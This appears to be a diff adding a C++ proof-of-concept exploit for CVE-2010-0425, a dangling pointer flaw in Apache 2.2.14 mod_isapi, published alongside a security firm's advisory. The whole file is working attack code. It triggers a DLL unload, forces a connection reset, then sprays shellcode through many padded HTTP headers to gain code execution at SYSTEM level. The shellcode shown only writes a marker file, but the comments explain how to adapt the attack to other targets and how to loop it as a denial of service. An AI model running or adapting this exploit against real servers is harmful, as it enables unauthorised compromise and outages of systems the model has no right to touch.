@@ -1,0 +1,299 @@
+/*
+ * Apache 2.2.14 mod_isapi Dangling Pointer Remote SYSTEM Exploit (CVE-2010-0425)
+ * ------------------------------------------------------------------------------
+ *
+ * Advisory: http://www.senseofsecurity.com.au/advisories/SOS-10-002
+ * 
+ * Description:
+ * pwn-isapi.cpp exploits a dangling pointer vulnerabilty in Apache 2.2.14 mod_isapi.
+ * Due to the nature of the vulnerability, and exploitation method, DEP should be limited to essential 
+ * Windows programs and services. At worst, if DEP is enabled for the Apache process, you could cause 
+ * a constant DoS by looping this (since apache will automatically restart) :)
+ *
+ * Note that the exploit code may need to be run multiple times before a shell is spawned (70%
+ * success rate - tested on three different systems). Furthermore, the exploit code may require 
+ * modification to exploit this vulnerability on different platforms. This is due to loaded memory 
+ * references to the unloaded DLL (they will be different for each ISAPI module). Do not test
+ * this code in a VM otherwise the code may fail to send the RESET packet (something to do with
+ * VMware gracefully closing the connection, instead of sending a RESET packet) - I didnt want
+ * to have to use raw packets on Windows. 
+ *
+ * Shellcode Note: 
+ * The shellcode writes "pwn-isapi" to "sos.txt" which is created in the current working directory. 
+ * Most operating systems should be supported by this shellcode. I've used Skylined's method of finding
+ * the base address of kernel32.dll for Windows 7 and modified it so that it will find the base 
+ * address of msvcrt.dll instead. I've also added another check so that it will be able to detect
+ * "msvcrt.dll" on Windows Server 2003 (this OS loads msvcrt.dll in 5th position, and before this
+ * DLL string is read, another DLL (RPCRT4.dll) length is verifiied which matches the length of 
+ * msvcrt.dll. So the added check will verify the presents of "m" before proceeding. 
+ *
+ * Author: 
+ * Brett Gervasoni (brettg [at] senseofsecurity.com.au)
+ *
+ * Copyright Sense of Security Pty Ltd 2010. 
+ * http://www.senseofsecurity.com.au
+ */
+
+#include <iostream>
+#include <windows.h>
+#include <winsock.h>
+#include <string>
+#include <direct.h>
+
+#pragma comment(lib, "wsock32.lib")
+
+using namespace std;
+
+#define SERVER_PORT 80
+
+void header();
+int createConnection(string targetAddr, int targetPort);
+int sendTransmission(string message);
+string recvTransmission();
+void cleanUp();
+
+WORD sockVersion;
+WSADATA wsaData;
+
+int sock;
+struct sockaddr_in rserver;
+
+int main(int argc, char *argv[])
+{
+	string serverIP, isapiDLL;
+	string triggerVuln, payload;
+	char accept[171], referer[733], cookie[5376], random[7604], postData[23379], footer[299];
+
+	//custom shellcode that writes "pwn-isapi" to "sos.txt" in the current working directory
+	//Note: There are four NOPs at the end for padding. Not really needed. 
+	char shellcode[] = "\x31\xc0\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x56\x08\x8b"
+					   "\x7e\x20\x8b\x36\x66\x39\x4f\x14\x75\xf2\x66\xb9\x01\x6d\x66\x81\xe9\x94"
+					   "\x6c\x66\x39\x0f\x66\x89\xc1\x75\xe1\x89\xe5\xeb\x71\x60\x8b\x6c\x24\x24"
+					   "\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3"
+					   "\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1"
+					   "\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66"
+					   "\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61"
+					   "\xc3\xad\x50\x52\xe8\xaa\xff\xff\xff\x89\x07\x66\x81\xc4\x0c\x01\x66\x81"
+					   "\xec\x04\x01\x66\x81\xc7\x08\x01\x66\x81\xef\x04\x01\x39\xce\x75\xde\xc3"
+					   "\xeb\x10\x5e\x8d\x7d\x04\x89\xf1\x80\xc1\x0c\xe8\xcd\xff\xff\xff\xeb\x3b"
+					   "\xe8\xeb\xff\xff\xff\x6e\x7c\x2e\xe1\x1e\x3c\x3f\xd7\x74\x1e\x48\xcd\x31"
+					   "\xd2\x58\x88\x50\x07\xeb\x2f\x31\xd2\x59\x88\x51\x01\xeb\x2e\x51\x50\xff"
+					   "\x55\x04\xeb\x2c\x31\xd2\x59\x88\x51\x09\xeb\x33\x51\x50\x89\xc6\xff\x55"
+					   "\x08\x53\xff\x55\x0c\xe8\xd1\xff\xff\xff\x73\x6f\x73\x2e\x74\x78\x74\x4e"
+					   "\xe8\xcc\xff\xff\xff\x77\x4e\xe8\xcd\xff\xff\xff\xe8\xcf\xff\xff\xff\x70"
+					   "\x77\x6e\x2d\x69\x73\x61\x70\x69\x4e\xe8\xc8\xff\xff\xff\x90\x90\x90\x90";
+
+	header();
+
+	if (argc < 3)
+	{
+		printf("usage: %s <ip> <DLL>\n", argv[0]);
+		return 1;
+	}
+
+	serverIP = string(argv[1]);
+	isapiDLL = string(argv[2]);
+
+	//all these values could be set to 7601 + sizeof(shellcode)
+	//but mixing it up is good. 
+	memset(accept, 'A', 170);
+	memset(referer, 'A', 732);
+	memset(cookie, 'A', 5375);
+	memset(random, 'A', 7603);
+	memset(postData, 'A', 23378);
+	memset(footer, 'A', 298);
+
+	triggerVuln = "POST /cgi-bin/" + isapiDLL + " HTTP/1.0\r\n"
+		"User-Agent: AAAAAAAA\r\n"
+		"Pragma: no-cache\r\n"
+		"Proxy-Connection: Keep-Alive\r\n"
+		"Host: " + serverIP + "\r\n"
+		"Content-Length: 40334\r\n\r\n" +
+		string(footer);
+
+	//Modify the below request if needed (depending on where your function pointer is pointing)
+	//Do so by adding or removing headers. So if you want to hit a higher function pointer, 
+	//keep adding headers :) 
+	//Note: If performing this blindly, try it a few times, change a bit, try again. 
+	//During testing i found that using a chunk of data the same size with the same header name
+	//was more unreliable. In memory, large amounts of nulls are being placed either side of the 
+	//payload. Since the function pointer address was random, by slightly mixing up the size of 
+	//each header i would get better results.
+	payload = "POST /cgi-bin/" + isapiDLL + " HTTP/1.0\r\n"
+		"Accept: " + string(accept) + "\r\n"
+		"Referer: " + string(referer) + string(shellcode) + "\r\n"
+		"From: " + string(cookie) + string(shellcode) + "\r\n"
+		"Utruvh-guiergher: " + string(cookie) + string(shellcode) + "\r\n"
+		"Accept-Language: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"
+		"Content-Type: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"
+		"UA-CPU: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"
+		"Pragma: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"
+		"User-Agent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"
+		"Cookie: " + string(cookie) + string(shellcode) + "\r\n"
+		"Host: " + serverIP + "\r\n"
+		"Proxy-Connection: Keep-Alive\r\n"
+		"Okytuasd: " + string(cookie) + string(shellcode) + "\r\n"
+		"Asdasdasdasdasd: " + string(random) + string(shellcode) + "\r\n"
+		"Asdasda: " + string(random) + string(shellcode) + "\r\n"
+		"Sewrwefbui: " + string(random) + string(shellcode) + "\r\n"
+		"Qdfasdernu: " + string(random) + string(shellcode) + "\r\n"
+		"Cdffew-asdf: " + string(random) + string(shellcode) + "\r\n"
+		"Kuiytnb-Ehrf: " + string(cookie) + string(shellcode) + "BBBB" + "\r\n"
+		"Lsfergjnuibubiu: " + string(cookie) + string(shellcode) + "BBBB" + "\r\n"
+		"Baefrwerifnhu: " + string(cookie) + string(shellcode) + "BBBB" + "\r\n"
+		"Zdsfno: " + string(cookie) + string(shellcode) + "BBBB" + "\r\n"
+		"Psdfsafn: " + string(cookie) + string(shellcode) + "BBBB" + "\r\n"
+		"Zefwefnuivre-sdf: " + string(cookie) + string(shellcode) + "BBBB" + "\r\n"
+		"Ivre-sdf: " + string(cookie) + string(shellcode) + "BBBB" + "\r\n"
+		"Yvasde-sdf: " + string(cookie) + string(shellcode) + "BBBB" + "\r\n"
+		"Yuionbsdf: " + string(cookie) + string(shellcode) + "BBBB" + "\r\n"
+		"Yasdasdasdf: " + string(cookie) + string(shellcode) + "BBBB" + "\r\n"
+		"asdasdde-sdf: " + string(cookie) + string(shellcode) + "BBBB" + "\r\n"
+		"Ertuioert-erf: " + string(cookie) + string(shellcode) + "BBBB" + "\r\n"
+		"Content-Length: 25054\r\n\r\n" + 
+		string(postData) + "CCCC" + string(shellcode) + "BBBB" + string(footer);
+
+	//Setup connection
+	if (createConnection(serverIP, SERVER_PORT) == 1)
+	{
+		printf("- an error occurred connecting to the server\n");
+		return 1;
+	}
+
+	printf("[+] Connected to %s.\n", serverIP.c_str());
+
+	printf("[+] Setting socket data structure values\n");
+	int iOptVal;
+	int aiOptVal;
+	
+	struct linger linger_data;
+	
+	//This is meant to set closesocket to do a "graceful close",
+	//however this is not the case when WSACancelBlockingCall() is called. A RESET packet is 
+	//sent as a result - Note that if in a vm, for some reason a RESET packet does not get sent. 
+	linger_data.l_onoff = 0;
+	linger_data.l_linger = 0;
+
+	setsockopt(sock, SOL_SOCKET, SO_LINGER, (char*)&linger_data, sizeof(linger_data));
+	setsockopt(sock, SOL_SOCKET, SO_DONTLINGER, (char*)&linger_data, sizeof(linger_data));
+
+	//Set SO_LINGER to 0 so WSACancelBlockingCall() will cause a RESET packet to be sent
+	getsockopt(sock, SOL_SOCKET, SO_LINGER, (char*)&linger_data, &iOptVal);
+	getsockopt(sock, SOL_SOCKET, SO_DONTLINGER, (char*)&linger_data, &aiOptVal);
+	printf("    - SO_LINGER value is set to %ld\n", linger_data.l_onoff);
+	printf("    - SO_DONTLINGER value is set to %ld\n", linger_data.l_linger);
+	
+	printf("[*] Triggering DLL unload\n");
+	sendTransmission(triggerVuln);
+
+	Sleep(2000); //Sleep for a bit, otherwise on first run a RESET packet doesn't get sent. 
+	WSACancelBlockingCall(); //Cause reset packet response
+
+	Sleep(2000); //The multiple Sleeps seem to break up stuff a bit, making it more reliable...
+	closesocket(sock);
+
+	Sleep(2000);
+	WSACleanup();
+	
+	Sleep(2000);
+	printf("[+] The DLL should be unloaded by now\n");
+	
+	//Reconnect to deliver payload
+	if (createConnection(serverIP, SERVER_PORT) == 1)
+	{
+		printf("- an error occurred connecting to the server\n");
+		return 1;
+	}
+	
+	printf("[*] Sending payload\n");
+	sendTransmission(payload);
+
+	cleanUp();
+
+	printf("[+] Check to see if sos.txt was created...\n");
+
+	return 0;
+}
+
+void header()
+{
+	printf("Apache 2.2.14 mod_isapi Remote SYSTEM Exploit (CVE-2010-0425)\n");
+	printf("-------------------------------------------------------------\n");
+	printf("         Brett Gervasoni (brettg [at] senseofsecurity.com.au)\n");
+	printf("                    Copyright Sense of Security Pty Ltd 2010.\n");
+}
+
+//Setup the server
+int createConnection(string serverIP, int port)
+{
+	int result = 0, len = 0;
+
+	sockVersion = MAKEWORD(1,1);
+	WSAStartup(sockVersion, &wsaData);
+	
+	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+	{
+		perror("error: socket()\n");
+		result = 1;
+	}
+
+	rserver.sin_family = AF_INET;
+	rserver.sin_port = htons(port);
+	rserver.sin_addr.s_addr = inet_addr(serverIP.c_str());
+	memset(&rserver.sin_zero, 0, 8);
+
+	len = sizeof(struct sockaddr_in);
+	
+	if ((connect(sock, (struct sockaddr *)&rserver, sizeof(struct sockaddr_in))) == -1)
+	{
+		perror("error: connect()\n");
+		result = 1;
+	}
+
+	return result;
+}
+
+//Send a message
+int sendTransmission(string message)
+{
+	int bytes_sent = 0;
+
+	bytes_sent = send(sock, message.c_str(), message.length(), 0);
+	if (bytes_sent < 0)
+	{
+		perror("error: send()\n");
+		exit(1);
+	}
+	
+	return bytes_sent;
+}
+
+//Receive a message
+string recvTransmission()
+{
+	string result;
+	char *c = new char[1];
+	int bytes_recv = 0;
+
+	while (c[0] != NULL)
+	{
+		bytes_recv = recv(sock, c, 1, 0);
+
+		if (bytes_recv < 0)
+		{
+			perror("error: recv()\n");
+			//exit(1);
+		}
+
+		result += c[0];
+	}
+
+	return result;
+}
+
+//Clean up the connection
+void cleanUp()
+{
+	closesocket(sock);
+	WSACleanup();
+}
